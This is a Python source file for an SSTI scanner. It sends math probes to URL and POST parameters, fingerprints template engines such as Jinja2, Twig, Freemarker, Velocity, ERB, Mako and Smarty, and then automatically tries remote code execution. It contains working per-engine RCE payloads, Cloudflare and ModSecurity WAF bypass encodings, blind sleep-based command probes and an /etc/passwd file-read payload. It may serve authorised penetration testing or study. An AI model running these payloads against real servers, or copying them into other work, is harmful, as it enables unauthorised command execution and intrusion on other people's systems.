"""
SSTI Scanner v1.0 — Server-Side Template Injection Detection

Features:
1. Polyglot probe — test multiple template engines simultaneously
2. Engine fingerprinting — identify Jinja2, Twig, Freemarker, Velocity, ERB, Pug, Mako, Smarty
3. Math-based verification — inject 7*7 or 7*'7' and check for 49 or 7777777
4. RCE payload generation per engine after identification
5. Blind SSTI via time-based detection
6. WAF bypass with encoding/concatenation tricks
7. Multi-injection-point — URL params, POST body, headers, cookies
8. Context detection — string vs code context

Integrates with: WAFDetector, SQLiScanner (shared params), RecursiveCrawler
"""

import re
import asyncio
import aiohttp
import random
import time
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from loguru import logger


# ──────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────

@dataclass
class SSTIResult:
    """Result of SSTI testing on a parameter."""
    url: str
    parameter: str
    vulnerable: bool = False
    engine: str = ""             # jinja2, twig, freemarker, velocity, erb, pug, mako, smarty, unknown
    payload_used: str = ""
    evidence: str = ""           # What the server returned
    rce_possible: bool = False   # Whether RCE was confirmed
    rce_output: str = ""         # Output of RCE command if tested
    confidence: float = 0.0
    injection_point: str = "url" # url, post, header, cookie
    severity: str = "critical"   # SSTI is almost always critical


# ──────────────────────────────────────────────────────────────────
# Template Engine Payloads
# ──────────────────────────────────────────────────────────────────

# Phase 1: Detection probes — math expressions that produce known results
# We use random numbers to avoid false positives
def _make_math_probe() -> Tuple[str, Dict[str, str]]:
    """Generate unique math expression and expected results per engine syntax."""
    a, b = random.randint(10, 50), random.randint(10, 50)
    product = a * b
    
    probes = {
        # Jinja2 / Twig / Nunjucks ({{ expr }})
        "jinja2_twig": (f"{{{{{a}*{b}}}}}", str(product)),
        # Freemarker (${expr})
        "freemarker": (f"${{{a}*{b}}}", str(product)),
        # ERB (<%= expr %>)
        "erb": (f"<%= {a}*{b} %>", str(product)),
        # Velocity (#set($x = expr))
        "velocity": (f"#set($x={a}*{b})${{x}}", str(product)),
        # Pug (#{expr}) — same as Freemarker syntax
        "pug": (f"#{{{a}*{b}}}", str(product)),
        # Mako (${expr})
        "mako": (f"${{{a}*{b}}}", str(product)),
        # Smarty ({math equation="expr"})
        "smarty": (f"{{math equation=\"{a}*{b}\"}}", str(product)),
        # Thymeleaf ([[${expr}]])
        "thymeleaf": (f"[[${{{a}*{b}}}]]", str(product)),
    }
    
    return str(product), probes


# Phase 2: Engine fingerprinting — differentiate between engines with same syntax
FINGERPRINT_PAYLOADS = {
    "jinja2": [
        ("{{7*'7'}}", "7777777"),           # Jinja2 repeats string
        ("{{config}}", "Config"),            # Jinja2 Flask config object
        ("{{self.__class__}}", "class"),     # Jinja2 introspection
        ("{{request.application}}", ""),     # Jinja2 Flask
        ("{{cycler.__init__.__globals__}}", "os"),  # Jinja2 globals
    ],
    "twig": [
        ("{{7*'7'}}", "49"),                 # Twig does math
        ("{{dump(app)}}", "App"),            # Twig Symfony dump
        ("{{'/etc/passwd'|file_excerpt(1)}}", "root"),  # Twig file read
        ("{{app.request.server.get('SERVER_NAME')}}", ""),  # Twig Symfony
    ],
    "freemarker": [
        ("${7*7}", "49"),
        ("${.version}", ""),                 # Freemarker version
        ("<#assign x='freemarker'>", ""),
        ("${\"freemarker.template.TemplateException\"?new()}", ""),
    ],
    "velocity": [
        ("#set($x=7*7)${x}", "49"),
        ("$class.inspect('java.lang.Runtime')", "Runtime"),
        ("#set($str=$class.inspect('java.lang.String'))", ""),
    ],
    "erb": [
        ("<%= 7*7 %>", "49"),
        ("<%= system('id') %>", "uid="),
        ("<%= `id` %>", "uid="),
    ],
    "pug": [
        ("#{7*7}", "49"),
        ("-var x = 7*7\n=x", "49"),
    ],
    "mako": [
        ("${7*7}", "49"),
        ("<%import os%>${os.popen('id').read()}", "uid="),
        ("${self.module.cache.util.os.popen('id').read()}", "uid="),
    ],
    "smarty": [
        ("{php}echo 7*7;{/php}", "49"),
        ("{system('id')}", "uid="),
        ("{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php echo 7*7;?>\",self::clearConfig())}", ""),
    ],
}

# Phase 3: RCE payloads per engine (non-destructive — just `id` or `whoami`)
RCE_PAYLOADS = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",  # List classes (no RCE, but proves access)
        "{{cycler.__init__.__globals__.os.popen('whoami').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    ],
    "twig": [
        "{{['id']|filter('system')}}",
        "{{['id']|map('system')}}",
        "{{app.request.query.get('x',['id'])|filter('system')}}",
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "velocity": [
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "erb": [
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= IO.popen('id').read() %>",
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
    ],
    "smarty": [
        "{system('id')}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru('id');?>\",self::clearConfig())}",
    ],
}

# WAF bypass encodings for SSTI
WAF_BYPASS_SSTI = {
    "cloudflare": [
        # Unicode escapes
        "{{''['\x5f\x5fclass\x5f\x5f']}}",
        # Concatenation
        "{{''.\\x5f\\x5fclass\\x5f\\x5f}}",
        # Attribute access via |attr()
        "{{''|attr('__class__')|attr('__mro__')}}",
        # request object bypass
        "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}",
    ],
    "modsecurity": [
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        "{%set x=config%}{{x}}",
    ],
    "generic": [
        # Jinja2 filter bypass
        "{{''|attr('\\x5f\\x5fcl'+'ass\\x5f\\x5f')}}",
        # Hex encoding
        "{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
        # String concatenation
        "{{''['__cla'+'ss__']}}",
    ],
}

# Blind SSTI probes (time-based)
BLIND_SSTI_PROBES = {
    "jinja2": "{{''.__class__.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('sleep 5').read()}}",
    "erb": "<%= system('sleep 5') %>",
    "mako": "${__import__('os').popen('sleep 5').read()}",
    "freemarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"sleep 5\")}",
}


# ──────────────────────────────────────────────────────────────────
# SSTI Scanner
# ──────────────────────────────────────────────────────────────────

class SSTIScanner:
    """Server-Side Template Injection detection engine."""

    def __init__(self, config=None):
        self.config = config
        self.timeout = 15
        self.blind_delay = 5      # Seconds for time-based detection
        self.max_params = 8       # Max params to test per URL
        self.test_rce = True      # Whether to attempt RCE verification
        self._semaphore = asyncio.Semaphore(3)

    # ──────────────────────────────────────────────────────────
    # Main entry point
    # ──────────────────────────────────────────────────────────

    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        waf_name: str = None,
    ) -> List[SSTIResult]:
        """
        Full SSTI scan on a URL.
        
        1. Extract parameters
        2. Inject polyglot math probes
        3. If math evaluates → fingerprint engine
        4. If engine identified → attempt RCE verification
        5. If no math evaluation → try blind (time-based)
        
        Args:
            url: Target URL with parameters
            session: aiohttp session
            waf_name: Detected WAF for bypass payloads
            
        Returns:
            List of SSTIResult
        """
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return results

        param_names = self._prioritize_params(list(params.keys()))[:self.max_params]
        logger.info(f"[SSTI] Testing {len(param_names)} params on {url[:60]}")

        for pname in param_names:
            try:
                result = await self._test_param(url, pname, params, session, waf_name)
                if result and result.vulnerable:
                    results.append(result)
                    logger.info(
                        f"[SSTI] VULNERABLE: {pname} engine={result.engine} "
                        f"rce={result.rce_possible} on {url[:50]}"
                    )
            except Exception as e:
                logger.debug(f"[SSTI] Error testing {pname}: {e}")

        return results

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """Sort params by SSTI likelihood."""
        HIGH = {'name', 'title', 'template', 'tpl', 'content', 'body', 'text',
                'msg', 'message', 'subject', 'desc', 'description', 'comment',
                'preview', 'render', 'view', 'page', 'display', 'output',
                'greeting', 'email', 'username', 'input', 'data', 'q', 'query',
                'search', 'term', 'keyword', 'value', 'label', 'field'}

        def score(p):
            return 0 if p.lower() in HIGH else 1

        return sorted(params, key=score)

    # ──────────────────────────────────────────────────────────
    # Per-parameter testing
    # ──────────────────────────────────────────────────────────

    async def _test_param(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession, waf_name: str = None,
    ) -> Optional[SSTIResult]:
        """Test a single parameter for SSTI."""
        expected, probes = _make_math_probe()

        async with self._semaphore:
            # Phase 1: Try each template syntax
            for engine_hint, (payload, result_str) in probes.items():
                try:
                    test_url = self._inject_param(url, param, params, payload)
                    async with session.get(test_url, ssl=False,
                                          timeout=aiohttp.ClientTimeout(total=self.timeout),
                                          allow_redirects=True) as resp:
                        body = await resp.text(errors='replace')
                        status = resp.status

                    if status >= 400:
                        continue

                    # Check if math was evaluated
                    if result_str in body and payload not in body:
                        # Math was evaluated! Now fingerprint the engine
                        logger.debug(f"[SSTI] Math evaluated for {engine_hint}: {payload} → {result_str}")
                        
                        engine = await self._fingerprint_engine(
                            url, param, params, engine_hint, session,
                        )

                        # Attempt RCE if enabled
                        rce_possible = False
                        rce_output = ""
                        if self.test_rce and engine:
                            rce_possible, rce_output = await self._test_rce(
                                url, param, params, engine, session, waf_name,
                            )

                        return SSTIResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            engine=engine or engine_hint,
                            payload_used=payload,
                            evidence=f"Math evaluation: {payload} → {result_str}",
                            rce_possible=rce_possible,
                            rce_output=rce_output[:200],
                            confidence=0.95 if rce_possible else 0.85,
                            injection_point="url",
                            severity="critical" if rce_possible else "high",
                        )

                    # Check for error messages (can leak engine info)
                    engine_from_error = self._check_error_leaks(body)
                    if engine_from_error:
                        return SSTIResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            engine=engine_from_error,
                            payload_used=payload,
                            evidence=f"Template error leaked engine: {engine_from_error}",
                            confidence=0.7,
                            injection_point="url",
                            severity="high",
                        )

                except asyncio.TimeoutError:
                    # Might be blind SSTI (template crashed or caused delay)
                    logger.debug(f"[SSTI] Timeout on {param} with {engine_hint}")
                except Exception as e:
                    logger.debug(f"[SSTI] Probe error: {e}")

            # Phase 2: Blind SSTI (time-based)
            blind_result = await self._test_blind(url, param, params, session)
            if blind_result:
                return blind_result

        return None

    # ──────────────────────────────────────────────────────────
    # Engine fingerprinting
    # ──────────────────────────────────────────────────────────

    async def _fingerprint_engine(
        self, url: str, param: str, params: Dict,
        hint: str, session: aiohttp.ClientSession,
    ) -> str:
        """Determine exact template engine using differentiating payloads."""
        # Map hint to candidate engines
        candidates = []
        if "jinja2" in hint or "twig" in hint:
            candidates = ["jinja2", "twig"]
        elif "freemarker" in hint or "pug" in hint or "mako" in hint:
            candidates = ["freemarker", "mako", "pug"]
        elif "erb" in hint:
            candidates = ["erb"]
        elif "velocity" in hint:
            candidates = ["velocity"]
        elif "smarty" in hint:
            candidates = ["smarty"]
        elif "thymeleaf" in hint:
            return "thymeleaf"
        else:
            candidates = list(FINGERPRINT_PAYLOADS.keys())

        for engine in candidates:
            payloads = FINGERPRINT_PAYLOADS.get(engine, [])
            for payload, expected in payloads[:2]:
                try:
                    test_url = self._inject_param(url, param, params, payload)
                    async with session.get(test_url, ssl=False,
                                          timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        body = await resp.text(errors='replace')

                    if expected and expected.lower() in body.lower():
                        logger.debug(f"[SSTI] Fingerprinted as {engine}")
                        return engine

                    # Jinja2 vs Twig differentiator
                    if engine == "jinja2" and "7777777" in body:
                        return "jinja2"
                    if engine == "twig" and payload == "{{7*'7'}}" and "49" in body:
                        return "twig"

                except Exception:
                    continue

        return hint.split('_')[0]  # Return base hint

    def _check_error_leaks(self, body: str) -> str:
        """Check response for template engine error messages."""
        error_patterns = {
            "jinja2": [
                r"jinja2\.exceptions\.\w+Error",
                r"UndefinedError",
                r"TemplateSyntaxError",
                r"jinja2\.sandbox",
            ],
            "twig": [
                r"Twig_Error_Syntax",
                r"Twig\\Error\\SyntaxError",
                r"twig\.error",
            ],
            "freemarker": [
                r"freemarker\.core\.\w+Exception",
                r"FreeMarker template error",
                r"freemarker\.template\.TemplateException",
            ],
            "velocity": [
                r"org\.apache\.velocity\.exception",
                r"VelocityException",
                r"ParseErrorException",
            ],
            "erb": [
                r"SyntaxError.*\(erb\)",
                r"ERB::Util",
            ],
            "mako": [
                r"mako\.exceptions",
                r"MakoException",
                r"CompileException",
            ],
            "smarty": [
                r"Smarty.*error",
                r"SmartyCompilerException",
                r"Smarty_Internal",
            ],
            "thymeleaf": [
                r"org\.thymeleaf\.exceptions",
                r"TemplateProcessingException",
            ],
        }

        for engine, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, body, re.I):
                    return engine

        return ""

    # ──────────────────────────────────────────────────────────
    # RCE verification
    # ──────────────────────────────────────────────────────────

    async def _test_rce(
        self, url: str, param: str, params: Dict,
        engine: str, session: aiohttp.ClientSession, waf_name: str = None,
    ) -> Tuple[bool, str]:
        """Attempt safe RCE verification (id/whoami only)."""
        payloads = RCE_PAYLOADS.get(engine, [])

        # Add WAF bypass payloads if needed
        if waf_name and engine == "jinja2":
            waf_key = waf_name.lower().replace(' ', '_')
            for key, bypasses in WAF_BYPASS_SSTI.items():
                if key in waf_key:
                    payloads = bypasses + payloads
                    break

        for payload in payloads[:3]:
            try:
                test_url = self._inject_param(url, param, params, payload)
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text(errors='replace')

                # Check for RCE evidence
                rce_indicators = [
                    r'uid=\d+',           # Linux id output
                    r'root:x:0:0',        # /etc/passwd
                    r'www-data',          # Common web user
                    r'[a-z_][a-z0-9_-]*\\[a-z_][a-z0-9_-]*',  # Windows domain\user
                    r'nt authority',       # Windows system
                ]

                for indicator in rce_indicators:
                    match = re.search(indicator, body, re.I)
                    if match:
                        return True, match.group()

                # Check for class listing (Jinja2 subclasses)
                if '__subclasses__' in payload and '<class' in body:
                    return True, "Class enumeration successful"

            except Exception as e:
                logger.debug(f"[SSTI] RCE test error: {e}")

        return False, ""

    # ──────────────────────────────────────────────────────────
    # Blind SSTI (time-based)
    # ──────────────────────────────────────────────────────────

    async def _test_blind(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession,
    ) -> Optional[SSTIResult]:
        """Time-based blind SSTI detection."""
        # First, measure baseline response time
        try:
            start = time.time()
            test_url = self._inject_param(url, param, params, "normalvalue123")
            async with session.get(test_url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=30)) as resp:
                await resp.read()
            baseline = time.time() - start
        except Exception:
            return None

        # Test each engine's sleep payload
        for engine, payload_tmpl in BLIND_SSTI_PROBES.items():
            payload = payload_tmpl if '%d' not in payload_tmpl else payload_tmpl % random.randint(100, 200)
            
            try:
                test_url = self._inject_param(url, param, params, payload)
                start = time.time()
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    await resp.read()
                elapsed = time.time() - start

                # If response took significantly longer than baseline + delay
                if elapsed >= baseline + self.blind_delay - 1:
                    logger.info(f"[SSTI] Blind SSTI detected! {engine} "
                               f"(baseline={baseline:.1f}s, delayed={elapsed:.1f}s)")
                    return SSTIResult(
                        url=url,
                        parameter=param,
                        vulnerable=True,
                        engine=engine,
                        payload_used=payload,
                        evidence=f"Time-based: baseline={baseline:.1f}s, delayed={elapsed:.1f}s",
                        rce_possible=True,  # Sleep worked → command execution confirmed
                        confidence=0.8,
                        injection_point="url",
                        severity="critical",
                    )

            except asyncio.TimeoutError:
                # Timeout could indicate sleep worked
                logger.debug(f"[SSTI] Timeout on blind test — possible {engine}")
            except Exception:
                continue

        return None

    # ──────────────────────────────────────────────────────────
    # POST-based SSTI
    # ──────────────────────────────────────────────────────────

    async def scan_post(
        self, url: str, post_data: Dict[str, str],
        session: aiohttp.ClientSession, waf_name: str = None,
    ) -> List[SSTIResult]:
        """Test POST parameters for SSTI."""
        results = []
        expected, probes = _make_math_probe()

        for pname in list(post_data.keys())[:self.max_params]:
            for engine_hint, (payload, result_str) in probes.items():
                test_data = dict(post_data)
                test_data[pname] = payload

                try:
                    async with session.post(url, data=test_data, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        body = await resp.text(errors='replace')

                    if result_str in body and payload not in body:
                        engine = engine_hint.split('_')[0]
                        results.append(SSTIResult(
                            url=url,
                            parameter=pname,
                            vulnerable=True,
                            engine=engine,
                            payload_used=payload,
                            evidence=f"POST SSTI: {payload} → {result_str}",
                            confidence=0.85,
                            injection_point="post",
                            severity="critical",
                        ))
                        break

                except Exception:
                    continue

        return results

    # ──────────────────────────────────────────────────────────
    # Utility
    # ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, params: Dict, value: str) -> str:
        """Build URL with modified parameter value."""
        parsed = urlparse(url)
        new_params = {}
        for k, v in params.items():
            if k == param:
                new_params[k] = value
            else:
                new_params[k] = v[0] if isinstance(v, list) else v
        new_query = urlencode(new_params, doseq=False)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))
